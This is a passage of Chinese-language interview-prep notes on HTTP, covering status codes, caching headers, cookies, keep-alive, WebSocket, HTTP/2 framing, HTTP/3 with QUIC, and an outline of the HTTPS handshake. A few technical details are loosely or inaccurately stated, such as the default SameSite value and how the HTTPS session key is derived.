Temporary Redirect：<strong>临时重定向</strong>。302 标准禁止 POST 变成 GET；303明确表示客户端应当采⽤ GET ⽅法获取资源，会把 POST 请求变为 GET 请求进⾏重定向；307 会遵守浏览器标准，不会从 POST 变成 GET。</li></ul></li><li>4xx (<strong>客户端错误</strong>状态码)： 请求报文有误，服务器无法处理请求。<ul><li>400 Bad Request：表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。</li><li>401 Unauthorized：表示<strong>发送的请求需要有通过 HTTP 认证的认证信息</strong>。</li><li>403 Forbidden：表示请求资源的访问<strong>被服务器拒绝</strong>了，比如法律禁止、信息敏感。</li><li>404 Not Found：表示<strong>服务器上无法找到相应的资源</strong>。</li><li>405 Method Not Allowed：表示请求方法不被服务器端允许。</li><li>408 Request Timeout: 服务器等待了太长时间。</li></ul></li><li>5xx(<strong>服务器错误</strong>状态码)： 服务器处理请求出错。<ul><li>500 Internal Server Error：服务器端在执行请求时发生了错误。</li><li>501 Not Implemented：表示客户端请求的功能还不支持。</li><li>502 Bad GateWay：该状态码表明扮演网关或代理角色的服务器，从上游服务器中接收到的响应是无效的。</li><li>503 Service Unavailable：表示服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。使用场景：nginx 设置限速，超过限速，会返回503。</li><li>504 Gateway Timeout：表示网关或者代理的服务器无法在规定的时间内获得想要的响应。</li></ul></li></ul><h3 id="HTTP-状态码-304"><a href="#HTTP-状态码-304" class="headerlink" title="HTTP 状态码 304"></a>HTTP 状态码 304</h3><p>当客户端对指定缓存机制的页面进行请求时，服务器会根据缓存内容判断页面与之前是否相同，若相同便直接返回304，此时客户端调用缓存内容，不必进行二次下载。状态码304不应该认为是一种错误，而是服务端对<strong>有缓存情况的</strong>客户端的一种响应。</p><p><strong>产生较多304状态码的原因：</strong></p><ul><li>页面更新周期长或不更新</li><li>纯静态页面或强制生成静态html</li></ul><p><strong>304状态码出现过多会造成以下问题：</strong></p><ul><li>网站快照停止</li><li>收录减少</li><li>权重下降</li></ul><h2 id="对Accept系列字段的理解"><a href="#对Accept系列字段的理解" class="headerlink" title="对Accept系列字段的理解"></a>对Accept系列字段的理解</h2><p><img src="https://i.loli.net/2021/10/14/M3KDvlOiSjIAHBq.png" alt="image.png"></p><ol><li><p><strong>数据格式：</strong>MIME，体现在发送端的 Content-Type 字段，接收端的 Accept字段。这两个字段的取值可以分为下面几类:</p><ul><li><p>text: text/html， text/plain， text/css 等</p></li><li><p>image: image/gif， image/jpeg， image/png 等</p></li><li><p>audio/video: audio/mpeg， video/mp4 等</p></li><li><p>application: application/json， application/javascript， application/pdf， application/octet-stream</p></li></ul></li><li><p><strong>压缩方式：</strong>发送方的Content-Encoding字段和接受方的Accept-Encoding字段。这个字段的取值有下面几种：</p><ul><li><p>gzip: 当今最流行的压缩格式</p></li><li><p>deflate: 另外一种著名的压缩格式</p></li><li><p>br: 一种专门为 HTTP 发明的压缩算法</p></li></ul></li><li><p><strong>支持语言：</strong>发送方的 Content-Language 字段，在需要实现国际化的方案当中，可以用来指定支持的语言；接受方对应的字段为Accept-Language。</p></li><li><p><strong>字符集：</strong>接收方的 Accept-Charset，指定可以接受的字符集；发送端直接放在了 Content-Type 中，以 charset 属性指定。</p></li></ol><h2 id="HTTP1-1-如何解决-HTTP-的队头阻塞问题？"><a href="#HTTP1-1-如何解决-HTTP-的队头阻塞问题？" class="headerlink" title="HTTP1.1 如何解决 HTTP 的队头阻塞问题？"></a>HTTP1.1 如何解决 HTTP 的队头阻塞问题？</h2><p><strong>问题定义：</strong></p><p>HTTP 传输是基于请求-应答的模式进行的，报文必须是一发一收，但是里面的任务被放在一个任务队列中<strong>串行执行</strong>，一旦队首的请求处理太慢，就会阻塞后面请求的处理。</p><p><strong>并发连接：</strong></p><p>对于一个域名允许分配多个长连接，相当于增加了任务队列，不至于一个队伍的任务阻塞其它所有任务。目前 Chrome 中客户端最多并发 6 个连接。</p><p><strong>域名分片</strong></p><p>多分几个域名,如 content1.xxx.com 、content2.xxx.com。这样一个 xxx.com 域名下可以分出非常多的二级域名，而它们都指向同样的一台服务器，能够并发的长连接数更多了，事实上也更好地解决了队头阻塞的问题。</p><h2 id="谈一谈-HTTP-数据传输"><a href="#谈一谈-HTTP-数据传输" class="headerlink" title="谈一谈 HTTP 数据传输"></a>谈一谈 HTTP 数据传输</h2><p><strong>定长数据：</strong>发送端在发送数据的过程中，需要设置 Content-Length，来指明发送数据的长度。</p><ul><li>Content-Length 如果存在并且有效的话，则必须和消息内容的传输长度完全一致，即过短就会截断，过长就会导致超时。</li><li>如果采用短链接，直接可以通过服务器关闭连接来确定消息的传输长度。</li><li>在 HTTP/1.0 之前的版本中，Content-Length 字段可有可无，因为一旦服务器关闭连接，就可以获取到传输数据的长度。</li><li>在 HTTP/1.1 版本中，如果是 Keep-alive 的话，chunked 优先级高于 Content-Length，若是非 Keep-alive，跟前面一样，Content-Length 可有可无。</li></ul><p><strong>不定长数据：</strong>现在采用最多的就是HTTP/1.1版本来完成传输数据，在保存 Keep-alive 状态下，当数据不定长时，需要设置新的头部字段 <code>Transfer-Encoding: chunked</code>。通过 chunked 机制，可以完成对不定长数据的处理。</p><h2 id="HTTP缓存"><a href="#HTTP缓存" class="headerlink" title="HTTP缓存"></a>HTTP缓存</h2><h3 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h3><p>强缓存分为两种情况，一种是发送 HTTP 请求，一种不需要发送。</p><p>HTTP1.0版本，使用的是 Expires，HTTP1.1使用的是 Cache-Control</p><p><strong>注意点</strong>:</p><ul><li>当 Expires 和 Cache-Control 同时存在时，优先考虑 Cache-Control。</li><li>当缓存资源失效（即没有命中强缓存）就进入协商缓存</li></ul><p><strong>Expires：</strong>Expires 即过期时间，相对于服务器的时间而言，存在于服务端返回的响应头中，在这个过期时间之前可以直接从缓存里面获取数据，无需再次请求。过期时就会重新向服务器发起请求。但这个方式的问题是<strong>服务器的时间和浏览器的时间可能并不一致</strong>。（故采用 Cache-Control）</p><p><strong>Cache-Control：</strong>这个字段采用的时间是过期时长，对应的是 max-age。<code>Cache-Control:max-age=6000</code> 代表该资源返回后6000秒，可以直接使用缓存。</p><h3 id="协商缓存（高频）"><a href="#协商缓存（高频）" class="headerlink" title="协商缓存（高频）"></a>协商缓存（高频）</h3><p>强缓存失效后，浏览器在请求头中携带响应的缓存 Tag 来向服务器发送请求，服务器根据对应的tag，来决定是否使用缓存。协商缓存分为两种，<strong>Last-Modified</strong> 和 <strong>ETag</strong>，各有优势。</p><p><strong>Last-Modified</strong>：表示<strong>最后修改时间</strong>。在浏览器第一次给服务器发送请求后，服务器会在响应头中加上这个字段。浏览器接收到后，如果再次请求，会在请求头中携带 If-Modified-Since 字段，这个字段的值也就是服务器传来的最后修改时间。服务器拿到请求头中的 If-Modified-Since 的字段后，会和这个服务器中该资源的最后修改时间对比:</p><ul><li>如果请求头中的这个值小于最后修改时间，返回新的资源。</li><li>否则返回304，告诉浏览器直接使用缓存。</li></ul><p><strong>ETag</strong>：服务器根据当前文件的内容，对文件生成唯一的标识，比如 MD5 算法。只要里面的内容有改动，这个值就会修改，服务器通过响应头把该字段给浏览器。浏览器接受到ETag值，会在下次请求的时候，将这个值作为 If-None-Match 这个字段的内容发给服务器。服务器接收到 If-None-Match 后，会跟服务器上该资源的 ETag 进行比对：</p><ul><li>如果两者一样，返回304，告诉浏览器直接使用缓存。</li><li>如果不一样，返回新的资源。</li></ul><p><strong>两者对比：</strong></p><ul><li>性能：Last-Modified 优于 ETag，Last-Modified 记录的是时间点，而 Etag 需要根据文件的 MD5 算法生成对应的 hash 值。</li><li>精度：ETag 优于 Last-Modified。ETag按照内容给资源带上标识，能准确感知资源变化，Last-Modified 在某些场景并不能准确感知变化，比如<ul><li>编辑了资源文件，但是文件内容并没有更改，这样也会造成缓存失效。</li><li>Last-Modified 能够感知的单位时间是秒，如果文件在 1 秒内改变了多次，那么这时候的 Last-Modified 并没有体现出修改了。</li></ul></li></ul><p>最后，如果两种方式都支持的话，服务器会优先考虑 ETag。</p><h3 id="代理缓存"><a href="#代理缓存" class="headerlink" title="代理缓存"></a>代理缓存</h3><p><strong>为什么产生代理缓存？</strong>对于源服务器来说，它也是有缓存的，比如 Redis， Memcache，但对于 HTTP 缓存来说，如果每次客户端缓存失效都要到源服务器获取，那给源服务器的压力是很大的。</p><p>由此引入了缓存代理的机制。让代理服务器接管一部分的服务端HTTP缓存，客户端缓存过期后就近到代理缓存中获取，代理缓存过期了才请求源服务器，这样流量巨大的时候能明显降低源服务器的压力。</p><p>缓存代理的控制分为两部分，一部分是<strong>源服务器端的控制</strong>，一部分是<strong>客户端的控制</strong>。</p><h3 id="缓存位置"><a href="#缓存位置" class="headerlink" title="缓存位置"></a>缓存位置</h3><ol><li><p><strong>Service Worker</strong>：应用场景比如 PWA，借鉴了 Web Worker 思路，由于它脱离了浏览器的窗体，因此无法直接访问DOM。它能完成的功能比如：离线缓存、消息推送和网络代理，其中离线缓存就是 Service Worker Cache 。</p></li><li><p><strong>Memory Cache</strong>：内存缓存，从效率上讲是最快的，从存活时间来讲又是最短的，当渲染进程结束后，内存缓存也就不存在了。</p></li><li><p><strong>Disk Cache：</strong>存储在磁盘中的缓存，从存取效率上讲是比内存缓存慢的，优势在于存储容量和存储时长。</p><p><strong>Disk Cache VS Memory Cache</strong></p><ul><li>内容使用率高的话，文件优先进入磁盘</li></ul></li></ol><ul><li>比较大的JS，CSS文件会直接放入磁盘，反之放入内存。</li></ul><ol start="4"><li><strong>Push Cache</strong>：推送缓存，这算是浏览器中最后一道防线</li></ol><h2 id="如何理解-HTTP-代理"><a href="#如何理解-HTTP-代理" class="headerlink" title="如何理解 HTTP 代理"></a>如何理解 HTTP 代理</h2><p>我们知道 HTTP 是基于请求-响应模型的协议，一般由客户端发请求，服务器来进行响应。当然，特殊情况就是代理服务器。引入代理之后，作为代理的服务器相当于一个中间人的角色，对于客户端而言，表现为服务器进行响应；而对于源服务器，表现为客户端发起请求，具有双重身份。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul><li><strong>负载均衡</strong>。客户端的请求只会先到达代理服务器，后面到底有多少源服务器，IP 是多少，客户端是不知道的。因此这个代理服务器拿到这个请求之后，可以通过特定的算法分发给不同的源服务器，让各台源服务器的负载尽量平均。</li><li><strong>保障安全</strong>。利用心跳机制监控后台的服务器，一旦发现故障机就将其踢出集群。并且对于上下行的数据进行过滤，对非法 IP 限流，这些都是代理服务器的工作。</li><li><strong>缓存代理</strong>。将内容缓存到代理服务器，使得客户端可以直接从代理服务器获得而不用到源服务器那里。</li></ul><h2 id="Cookie（高频）"><a href="#Cookie（高频）" class="headerlink" title="Cookie（高频）"></a>Cookie（高频）</h2><h3 id="Cookie-简介"><a href="#Cookie-简介" class="headerlink" title="Cookie 简介"></a>Cookie 简介</h3><p>Cookie 本质是<strong>浏览器里面存储的一个很小的文本文件</strong>，内部以键值对的方式来存储。向同一个域名下发送请求，都会携带相同的 Cookie，服务器拿到 Cookie 进行解析，便能拿到客户端的状态。服务端可以通过响应头中的Set-Cookie字段来对客户端写入Cookie。</p><h3 id="Cookie-属性"><a href="#Cookie-属性" class="headerlink" title="Cookie 属性"></a>Cookie 属性</h3><p>Cookie 的有效期可以通过 Expires 和 Max-Age 两个属性来设置。</p><ul><li>Expires 即过期时间</li><li>Max-Age 用的是一段时间间隔，单位是秒，从浏览器收到报文开始计算。</li></ul><p>若 Cookie 过期，则这个 Cookie 会被删除，并不会发送给服务端。</p><p><strong>作用域</strong></p><p>关于作用域也有两个属性: Domain 和 path，给 Cookie 绑定了域名和路径，在发送请求之前，发现域名或者路径和这两个属性不匹配，那么就不会带上 Cookie。</p><p><strong>安全相关</strong></p><ol><li>如果带上Secure，说明只能通过 HTTPS 传输 cookie。</li><li>如果 cookie 字段带上HttpOnly，那么说明只能通过 HTTP 协议传输，不能通过 JS 访问，这也是预防 XSS 攻击的重要手段。</li><li>相应的，对于 CSRF 攻击的预防，也有 SameSite 属性。SameSite 可以设置为三个值，Strict、Lax和None。<ul><li>Strict 模式：浏览器完全禁止第三方请求携带Cookie。比如请求 sanyuan.com网站只能在 sanyuan.com 域名当中请求才能携带 Cookie，在其他网站请求都不能。</li><li>Lax 模式：只能在 get 方法提交表单况或者 a 标签发送 get 请求的情况下可以携带 Cookie，其他情况均不能。</li><li>None 模式（默认模式）：请求会自动携带上 Cookie。</li></ul></li></ol><h3 id="Cookie-缺陷"><a href="#Cookie-缺陷" class="headerlink" title="Cookie 缺陷"></a>Cookie 缺陷</h3><p>1、<strong>容量</strong>缺陷。Cookie 的体积上限只有4KB，只能用来存储少量的信息。</p><p>2、<strong>性能</strong>缺陷。Cookie 紧跟域名，不管域名下面的某一个地址需不需要这个 Cookie ，请求都会携带上完整的 Cookie，这样随着请求数的增多，其实会造成巨大的性能浪费的，因为请求携带了很多不必要的内容。但可以通过 Domain 和 Path 指定作用域来解决。</p><p>3、<strong>安全</strong>缺陷。由于 Cookie 以纯文本的形式在浏览器和服务器中传递，很容易被非法用户截获，然后进行一系列的篡改，在 Cookie 的有效期内重新发送给服务器，这是相当危险的。另外，在HttpOnly为 false 的情况下，Cookie 信息能直接通过 JS 脚本来读取。</p><h2 id="HTTP-如何实现长连接？"><a href="#HTTP-如何实现长连接？" class="headerlink" title="HTTP 如何实现长连接？"></a>HTTP 如何实现长连接？</h2><p>通过在头部（请求和响应头）设置 <code>Connection: keep-alive</code>，HTTP1.0协议支持，但是默认关闭，从HTTP1.1协议以后，连接默认都是长连接。</p><h3 id="什么是-keep-alive"><a href="#什么是-keep-alive" class="headerlink" title="什么是 keep-alive"></a>什么是 keep-alive</h3><p>HTTP 协议采用“请求-应答”模式。当使用普通模式（非 KeepAlive 模式）时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；</p><p>当使用 Keep-Alive 模式（又称持久连接、连接重用）时，Keep-Alive 功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。W</p><p><strong>开启Keep-Alive的优缺点：</strong></p><p>优点：Keep-Alive 模式更加<strong>高效</strong>，因为避免了连接建立和释放的开销。</p><p>缺点：长时间的 TCP 连接容易导致<strong>系统资源无效占用</strong>，浪费系统资源。</p><h3 id="为什么要使用keep-alive"><a href="#为什么要使用keep-alive" class="headerlink" title="为什么要使用keep-alive"></a>为什么要使用keep-alive</h3><p><img src="https://i.loli.net/2021/10/14/AZyEXFcKzuRBDxC.png" alt="image.png"></p><p>为了能在多次HTTP之前重用同一个 TCP 连接，从而减少创建/关闭多个 TCP 连接的开销（包括响应时间、CPU 资源、减少拥堵等）</p><h2 id="短轮询、长轮询、SEE（长连接）和-WebSocket-间的区别？"><a href="#短轮询、长轮询、SEE（长连接）和-WebSocket-间的区别？" class="headerlink" title="短轮询、长轮询、SEE（长连接）和 WebSocket 间的区别？"></a>短轮询、长轮询、SEE（长连接）和 WebSocket 间的区别？</h2><h3 id="短轮询"><a href="#短轮询" class="headerlink" title="短轮询"></a>短轮询</h3><p>短轮询的基本思路:</p><ul><li>浏览器<strong>每隔一段时间向服务器发送 http 请求，服务器端收到请求后，不论是否有数据更新都直接进行响应</strong>。</li><li>这种方式实现的即时通信，本质上还是浏览器发送请求，服务器接受请求的一个过程，通过让客户端不断的进行请求，使得客户端能够模拟实时地收到服务器端的数据的变化。</li></ul><p>优缺点：</p><ul><li>优点是<strong>比较简单</strong>，易于理解。</li><li>缺点是这种方式由于需要不断的建立 http 连接，<strong>严重浪费</strong>服务器端和客户端的<strong>资源</strong>。当用户增加时，服务器端的压力就会变大，这是很不合理的。</li></ul><h3 id="长轮询"><a href="#长轮询" class="headerlink" title="长轮询"></a>长轮询</h3><p>长轮询的基本思路:</p><ul><li>首先由客户端向服务器发起请求，当服务器收到客户端发来的请求后，<strong>服务器端不会直接进行响应，而是先将这个请求挂起，然后判断服务器端数据是否有更新。</strong></li><li><strong>如果有更新，则进行响应，如果一直没有数据，则到达一定的时间限制才返回。</strong>客户端 JavaScript 响应处理函数会在处理完服务器返回的信息后，再次发出请求，重新建立连接。</li></ul><p>优缺点：</p><ul><li>优点是<strong>明显减少了很多不必要的 http 请求次数</strong>，节约资源。</li><li>缺点是<strong>连接挂起也会导致资源的浪费</strong>。</li></ul><h3 id="长连接（高频）"><a href="#长连接（高频）" class="headerlink" title="长连接（高频）"></a>长连接（高频）</h3><p>服务器使用流信息向服务器推送信息。严格地说，http 协议无法做到服务器主动推送信息。但是，服务器可以向客户端声明，接下来要发送的是流信息（<strong>发送的不是一次性的数据包，而是一个数据流，连续不断</strong>）。这时客户端不会关闭连接，而是一直等服务器发新的数据流，例如<strong>视频播放</strong>。</p><p>它相对于前面两种方式来说，<strong>不需要建立过多的 http 请求</strong>，相比之下节约了资源。</p><h3 id="WebSocket（高频）"><a href="#WebSocket（高频）" class="headerlink" title="WebSocket（高频）"></a>WebSocket（高频）</h3><p>WebSocket 是 HTML5 提供的一种<strong>浏览器与服务器进行全双工通讯的网络技术</strong>，属于应用层协议。它基于 TCP 传输协议，并复用 HTTP 的握手通道。<strong>浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接， 并进行双向数据传输。</strong></p><p><strong>原理 ：</strong>客户端向 WebSocket 服务器通知一个带有所有接收者ID的事件，服务器接收后立即通知所有活跃的客户端，只有 ID 在接收者 ID 序列中的客户端才会处理这个事件。</p><p><strong>特点：</strong></p><ul><li>支持双向通信，<strong>服务器可以向客户端主动推动消息</strong>，客户端也可以主动向服务器推送消息。（最大特点）</li><li>可以发送文本，也可以发送二进制数据</li><li>建立在 TCP 协议之上，服务端的实现比较容易</li><li>数据格式比较轻量，性能开销小，通信高效</li><li>没有同源限制，客户端可以与任意服务器通信</li><li>协议标识符是 ws（如果加密，则为wss），服务器网址就是 URL</li><li>与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</li></ul><p><strong>缺点：</strong>在服务器端的配置比较复杂。</p><h3 id="WebSocket-与-Ajax-的区别"><a href="#WebSocket-与-Ajax-的区别" class="headerlink" title="WebSocket 与 Ajax 的区别"></a>WebSocket 与 Ajax 的区别</h3><ol><li><strong>本质不同</strong>：<ul><li>WebSocket 是 HTML5 的一种新协议，实现了浏览器和服务器的实时通信</li><li>Ajax 即异步 JavaScript 和 XML，是一种创建交互式网页应用的网页开发技术</li></ul></li><li><strong>生命周期不同：</strong><ul><li>WebSocket 是长连接，会话一直保持</li><li>Ajax 发送接收之后就会断开</li></ul></li><li><strong>适用范围：</strong><ul><li>WebSocket 用于前后端实时交互数据</li><li>Ajax 非实时</li></ul></li><li><strong>发起人：</strong><ul><li>WebSocket 服务器端和客户端相互推送</li><li>Ajax 客户端发起</li></ul></li></ol><h2 id="http1-1-和-http2-0-的区别？（todo）"><a href="#http1-1-和-http2-0-的区别？（todo）" class="headerlink" title="http1.1 和 http2.0 的区别？（todo）"></a>http1.1 和 http2.0 的区别？（todo）</h2><h2 id="HTTP-2-的新特性？（高频）"><a href="#HTTP-2-的新特性？（高频）" class="headerlink" title="HTTP/2 的新特性？（高频）"></a>HTTP/2 的新特性？（高频）</h2><p><strong>二进制协议</strong>：HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”，可以分为头信息帧和数据帧。 帧的概念是它实现多路复用的基础。</p><p><strong>数据流</strong>：HTTP/2 将每个请求或回应的所有数据包，称为一个数据流。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流 ID，用来区分它属于哪个数据流。</p><h3 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a>头部压缩</h3><p>由于 HTTP 1.1 协议不带有状态，每次请求都必须附上所有信息。所以，<strong>请求的很多字段都是重复的</strong>，比如 Cookie 和 User Agent ，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。</p><p>HTTP/2 针对头部字段，采用了对应的压缩算法——HPACK，对请求头进行压缩。HPACK 算法主要的亮点有两个：</p><ol><li><p>在服务器和客户端之间建立哈希表，将用到的字段存放在这张表中，那么在传输的时候对于之前出现过的值，只需要把索引传给对方即可。这种<strong>传索引</strong>的方式，让请求头字段得到极大程度的精简和复用。</p></li><li><p>对于整数和字符串进行<strong>哈夫曼编码</strong>，原理是先将所有出现的字符建立一张索引表，然后让出现次数多的字符对应的索引尽可能短，传输的时候也传输这样的索引序列，可以达到非常高的压缩率。</p></li></ol><h3 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h3><p>HTTP/2 仍然复用 TCP 连接，但是<strong>在一个连接里，客户端和服务器都可以同时发送多个请求或回应，而且不用按照顺序一一发送</strong>，这样就避免了”队头堵塞”的问题。</p><p>HTTP/2 从 HTTP 协议本身解决了队头阻塞问题。<strong>注意，这里并不是指的 TCP 队头阻塞，而是HTTP队头阻塞，两者并不是一回事。</strong> TCP 的队头阻塞是在<strong>数据包</strong>层面，单位是数据包，前一个报文没有收到便不会将后面收到的报文上传给 HTTP，而 HTTP 的队头阻塞是在 <strong>HTTP 请求-响应</strong>层面，前一个请求没处理完，后面的请求就要阻塞住。</p><p><strong>二进制分帧：</strong></p><ul><li><p>HTTP/2 认为明文传输不方便计算机的解析，因为有些字符在内部需要用到状态机去识别，效率比较低。于是 HTTP/2 把报文全部换成二进制格式，传输 01 串，方便了机器的解析。</p></li><li><p>用 Headers 帧存放头部字段，Data 帧存放请求体数据。分帧之后，服务器看到的不再是一个个完整的 HTTP 请求报文，而是一堆乱序的二进制帧。这些二进制帧不存在先后关系，因此也就不会排队等待，没有了 HTTP 的队头阻塞问题。</p></li><li><p>通信双方都可以给对方发送二进制帧，这种二进制帧的双向传输的序列 ，也叫做流。<strong>HTTP/2 用流来在一个 TCP 连接上进行多个数据帧的通信，这就是多路复用的概念。</strong></p></li></ul><p>既然是乱序首发，那最后如何来处理这些乱序的数据帧呢？</p><ul><li>乱序指的是<strong>不同 ID 的 Stream 是乱序</strong>的，但同一个 Stream ID 的帧一定是按顺序传输的。</li><li>二进制帧到达后对方会将 Stream ID 相同的二进制帧组装成完整的请求报文和响应报文。</li><li>在二进制帧当中还有其他的一些字段，实现了优先级和流量控制等功能，这样就可以设置数据帧的优先级，让服务器处理重要资源，优化用户体验。</li></ul><h3 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h3><p>在 HTTP/2 当中，服务器已经不再是完全被动地接收请求、响应请求，它也能新建 Stream 来给客户端发送消息，当 TCP 连接建立之后，比如浏览器请求一个 HTML 文件，服务器就可以在返回 HTML 的基础上，将 HTML 中引用到的其他资源文件一起返回给客户端，减少客户端的等待。(<strong>允许服务器未经请求，主动向客户端发送资源</strong>)</p><h3 id="请求优先级"><a href="#请求优先级" class="headerlink" title="请求优先级"></a>请求优先级</h3><p>可以设置数据帧的优先级，让服务端先处理重要资源，优化用户体验。</p><h2 id="HTTP-2-中的二进制帧如何设计"><a href="#HTTP-2-中的二进制帧如何设计" class="headerlink" title="HTTP/2 中的二进制帧如何设计"></a>HTTP/2 中的二进制帧如何设计</h2><h3 id="帧结构"><a href="#帧结构" class="headerlink" title="帧结构"></a>帧结构</h3><p><img src="https://i.loli.net/2021/10/14/xlUFEQjCkgarmhv.png" alt="image.png"></p><ol><li><p>每个帧分为帧头和帧体。先是三个字节的帧长度，表示帧体的长度。</p></li><li><p>然后是帧类型，可以分为数据帧和控制帧两种。数据帧用来存放 HTTP 报文，控制帧用来管理流的传输。</p></li><li><p>接下来的一个字节是帧标志，里面一共有 8 个标志位，常用的有 END_HEADERS 表示头数据结束，END_STREAM 表示单方向数据发送结束。</p></li><li><p>后 4 个字节是 Stream ID，也就是流标识符，有了它，接收方就能从乱序的二进制帧中选择出 ID 相同的帧，按顺序组装成请求/响应报文。</p></li></ol><h3 id="流的状态变化"><a href="#流的状态变化" class="headerlink" title="流的状态变化"></a>流的状态变化</h3><p><img src="https://i.loli.net/2021/10/15/imyFWCzY5bNOhSa.png" alt="image.png"></p><p> HTTP/2 中，所谓的流其实就是<strong>二进制帧双向传输的序列</strong>。HTTP/2 借鉴了 TCP 状态变化的思想，根据帧的标志位来实现具体的状态改变。以一个普通的请求-响应过程为例：</p><ul><li><p>最开始两者都是空闲状态，当客户端发送 Headers 帧后，开始分配 Stream ID， 此时客户端的流打开， 服务端接收之后服务端的流也打开，两端的流都打开之后，就可以互相传递数据帧和控制帧了。</p></li><li><p>当客户端要关闭时，向服务端发送 END_STREAM 帧，进入半关闭状态， 这个时候客户端只能接收数据，而不能发送数据。</p></li><li><p>服务端收到这个 END_STREAM 帧后也进入半关闭状态，不过此时服务端的情况是只能发送数据，而不能接收数据。随后服务端也向客户端发送 END_STREAM 帧，表示数据发送完毕，双方进入关闭状态。</p></li><li><p>如果下次要开启新的流，流 ID 需要自增，直到上限为止，到达上限后开一个新的 TCP 连接重头开始计数。</p></li></ul><h3 id="流的特性"><a href="#流的特性" class="headerlink" title="流的特性"></a>流的特性</h3><ul><li><p>并发性。一个 HTTP/2 连接上可以同时发多个帧，这一点和 HTTP/1 不同。这也是实现多路复用的基础。</p></li><li><p>自增性。流 ID 是不可重用的，而是会按顺序递增，达到上限之后又新开 TCP 连接从头开始。</p></li><li><p>双向性。客户端和服务端都可以创建流，互不干扰，双方都可以作为发送方或者接收方。</p></li><li><p>可设置优先级。可以设置数据帧的优先级，让服务端先处理重要资源，优化用户体验。</p></li></ul><h2 id="HTTP-2-有哪些缺陷？HTTP-3-做了哪些优化？"><a href="#HTTP-2-有哪些缺陷？HTTP-3-做了哪些优化？" class="headerlink" title="HTTP/2 有哪些缺陷？HTTP/3 做了哪些优化？"></a>HTTP/2 有哪些缺陷？HTTP/3 做了哪些优化？</h2><p><img src="https://i.loli.net/2021/10/15/xJ63hqiRrDUZPsI.png" alt="image.png"></p><ul><li>HTTP/1.1 中的管道（ pipeline）传输如果有一个请求阻塞，那么队列后请求也会被阻塞</li><li>HTTP/2 多个请求复用一个 TCP 连接，一旦发生丢包，就会触发 TCP 的重传机制，阻塞所有的 HTTP 请求。</li></ul><p>这是基于 TCP 传输层的问题，所以 <strong>HTTP/3 把 HTTP 下层的 TCP 协议改成了 UDP</strong>。<strong>UDP 不管顺序，也不管丢包</strong>，所以不会出现以上问题。此外，<strong>基于 UDP 的 QUIC 协议 可以实现类似 TCP 的可靠性传输</strong>。</p><ul><li>QUIC 有自己的一套机制可以保证传输的可靠性的。当某个流发生丢包时，只会阻塞这个流，其他流不会受到影响。</li><li>TLS3 升级成了最新的 1.3 版本，头部压缩算法也升级成了 QPack 。</li><li>HTTPS 要建立一个连接，要花费 6 次交互，先是建立三次握手，然后是 TLS/1.3 的三次握手。 QUIC 直接把以往的 TCP 和 TLS/1.3 的 6 次交互合并成了 3 次，减少了交互次数。</li></ul><h2 id="HTTP3-0"><a href="#HTTP3-0" class="headerlink" title="HTTP3.0"></a>HTTP3.0</h2><p>HTTP/3 基于 UDP 协议实现了类似于 TCP 的多路复用数据流、传输可靠性等功能，这套功能被称为 <strong>QUIC 协议</strong>。</p><ul><li>流量控制、传输可靠性功能：QUIC 在 UDP 的基础上增加了一层来保证数据传输可靠性，它提供了数据包重传、拥塞控制、以及其他一些 TCP 中的特性。</li><li>集成 TLS 加密功能：目前 QUIC 使用 TLS1.3，减少了握手所花费的 RTT 数。</li><li>多路复用：同一物理连接上可以有多个独立的逻辑数据流，实现了数据流的单独传输，解决了 TCP 的队头阻塞问题。</li><li>快速握手：由于基于 UDP ，可以实现使用0 ~ 1个RTT来建立连接。</li></ul><h2 id="页面有多张图片，HTTP-加载如何解决？"><a href="#页面有多张图片，HTTP-加载如何解决？" class="headerlink" title="页面有多张图片，HTTP 加载如何解决？"></a>页面有多张图片，HTTP 加载如何解决？</h2><p>HTTP 1：浏览器对一个域名下最大 TCP 连接数为6，所以会请求多次。可以用多域名部署解决，提高同时请求的数目，加快页面图片的获取速度。</p><p>HTTP 2：支持多路复用，可以在一个 TCP 连接中发送多个HTTP请求，因此会一瞬间加载出来所有的资源，。</p><h2 id="HTTPS-协议具体流程（高频）"><a href="#HTTPS-协议具体流程（高频）" class="headerlink" title="HTTPS 协议具体流程（高频）"></a>HTTPS 协议具体流程（高频）</h2><p>HTTPS 是在 HTTP 和 TCP 之间建立了一个安全层，HTTP 与 TCP 通信的时候，必须先经过一个安全层，对数据包进行加密，然后将加密后的数据包传给 TCP。相应的 TCP 必须将数据包解密，才能传给 HTTP。</p><p><strong>具体流程</strong>：浏览器传输一个 client_random 和加密方法列表，服务器收到后，传给浏览器一个 server_random、加密方法列表和数字证书（包含了公钥），然后浏览器对数字证书进行合法验证，如果验证通过，则生成一个 pre_random，然后用公钥加密传给服务器，服务器用 client_random、server_random 和 pre_random ，使用公钥加密生成 secret，然后之后的传输使用这个 secret 作为秘钥来进行数据的加解密。</p><h2 id="相比于-HTTP，HTTPS-优势是如何实现的？"><a href="#相比于-HTTP，HTTPS-优势是如何实现的？" class="headerlink" title="相比于 HTTP，HTTPS 优势是如何实现的？"></a>相比于 HTTP，HTTPS 优势是如何实现的？</h2><ul><li>数据隐私性，内容经过加密；</li><li>数据完整性（加解密） ，内容经过完整性校验；</li><li>身份认证（数字签名） ，第三方无法伪装客户端/服务器的身份（数字证书）</li></ul><h2 id="HTTP-与-HTTPS-的区别（高频）"><a href="#HTTP-与-HTTPS-的区别（高频）" class="headerlink" title="HTTP 与 HTTPS 的区别（高频）"></a>HTTP 与 HTTPS 的区别（高频）</h2><ul><li><p>HTTP 是明文传输协议，HTTPS 协议是由 SSL+HTTP 